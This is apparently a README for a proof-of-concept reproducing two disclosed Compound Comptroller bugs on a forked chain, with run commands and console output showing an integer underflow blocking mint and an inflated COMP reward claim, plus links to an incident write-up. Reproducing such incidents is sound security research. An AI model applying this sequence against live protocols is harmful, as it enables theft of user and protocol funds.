# Compound PoC

## How to run

Install brownie first

Set up the environment variable for $ARCHIVENODE_TOKEN

```
export $ARCHIVENODE_TOKEN = xxxxx
sh start_archive.sh

then 

sh run.sh
```

```
Running 'scripts/gbu.py::main'...
Transaction sent: 0x52dcec6c4c5184b985bf6313f2a726576af16528c31929f92a387609ab0bf801
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 2
  IUniswapRouter.swapETHForExactTokens confirmed   Block: 13271936   Gas used: 123624 (0.14%)

------------------------- Bug 1: Integer underflow ------------------------
> before compSupplyState: index is 0, block is 13268664
> We can mint cTUSD now, because compSupply index is 0
Transaction sent: 0x6eacc27153b60f20b73c48fbeec6e25b8f9312191d772f5577bd7169f596109e
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 3
  ERC20.approve confirmed   Block: 13271937   Gas used: 47954 (0.05%)

Transaction sent: 0x590de0c5ff43d8402b8bb9ff99562a809eaa3a3f7c152ab38678db4eddf58102
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 4
  ICErc20.mint confirmed   Block: 13271938   Gas used: 171384 (0.19%)

> mint succeed! now the cTUSD we have is 4970006792
> setp 1: set compSpeed not zero to initialize COMP rewards
Transaction sent: 0xd13ba305481bedc49b87637d5dd9b0c68968bb9e0ed2f25c3de129a54c6df331
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 1
  IComptroller._setCompSpeed confirmed   Block: 13271939   Gas used: 51934 (0.06%)

> now compSpeed of cTUSD is 8 and compSupplyState is still 0
> step 2: set compSpeed zero to shutdown COMP rewards
Transaction sent: 0xa45442e48dae6a95cdd7aff292b713e78622610ee82a44684c569d27235dfe07
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 2
  IComptroller._setCompSpeed confirmed   Block: 13271940   Gas used: 47493 (0.05%)

> now we can see the compSupplyIndex is 32960483981234968672 which is < compInitialIndex(1e36)
 because of BUG1, this time mint failed
Transaction sent: 0xef570ad570d5f290dd9bcb88cfabe0341e8fbbce5166b7c17e7b483fdc85aed3
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 5
  ICErc20.mint confirmed (subtraction underflow)   Block: 13271941   Gas used: 94925 (0.11%)

-> ERROR: mint failed, revert: subtraction underflow
Transaction sent: 0xfd4bc36016d578d4054497b3b438e4375bde5718a6ae2f5486a76c1428711fbe
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 2
  IUniswapRouter.swapETHForExactTokens confirmed   Block: 13271936   Gas used: 123624 (0.14%)

Transaction sent: 0x6eacc27153b60f20b73c48fbeec6e25b8f9312191d772f5577bd7169f596109e
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 3
  ERC20.approve confirmed   Block: 13271937   Gas used: 47954 (0.05%)

Transaction sent: 0xed4ca557a6147f6d07b5646e5f53cd5a03c76202429836bdf56a5d4523a72e33
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 4
  ICErc20.mint confirmed   Block: 13271938   Gas used: 141384 (0.16%)

> before: user CompAccrued is 0
------------------------- Bug 2: Claim incorrect amount Comp ------------------------
> before: comp balance is 0
> remember, we have cTUSD now before new comptroller is deployed.
> cTUSD balance is 9940013584
> step 1: deploy new comptroller as same as Compound. 
Transaction sent: 0x023b0fb0ce74808bd730cb6f81485879a766168b042727b04f38bd14d651ffa1
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 1
  Comptroller.constructor confirmed   Block: 13271939   Gas used: 5067908 (5.76%)
  Comptroller deployed at: 0xc0B0471F308A10061884eF9cE0793975C06DeDb7

> the new comptroller's address is 0xc0B0471F308A10061884eF9cE0793975C06DeDb7
Transaction sent: 0x6716da4930bfbc7a785fcce0e0178c02cad39190c77cbca8cb7c0ddc02f1f9f0
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 2
  Transaction confirmed   Block: 13271940   Gas used: 44795 (0.05%)

Transaction sent: 0x06ea9632631a16ad59b0ec5b35ed2cdb0d03a7e1c3ec39f1346d11c7ecd680d4
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 3
  Comptroller._become confirmed   Block: 13271941   Gas used: 679379 (0.77%)

> now the new logic contract is 0xc0B0471F308A10061884eF9cE0793975C06DeDb7
> step 2: because of BUG2, we can claim a large amount comp rewards
Transaction sent: 0xf15daf4c570e653d7e5107b9acfa23a2d8c93df43a7e96271293ab0c8d880846
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 5
  IComptrollerNew.mintAllowed confirmed   Block: 13271942   Gas used: 59319 (0.07%)

> after: user CompAccrued is 9940013584
Transaction sent: 0xad881dc6bec325f28ddb92e8acc6d85ca99d4d1d70239786096f6c1222fe25bf
  Gas price: 0.0 gwei   Gas limit: 88000000   Nonce: 6
  IComptrollerNew.claimComp confirmed   Block: 13271943   Gas used: 128465 (0.15%)

🧛 > after: comp balance is 9940013584
```

## link 
- https://blocksecteam.medium.com/the-butterfly-effect-the-compound-security-incident-caused-by-a-bugfix-8f2052e9a759

- https://mp.weixin.qq.com/s/2ytMdDdsna6Vo-eKBMfYpw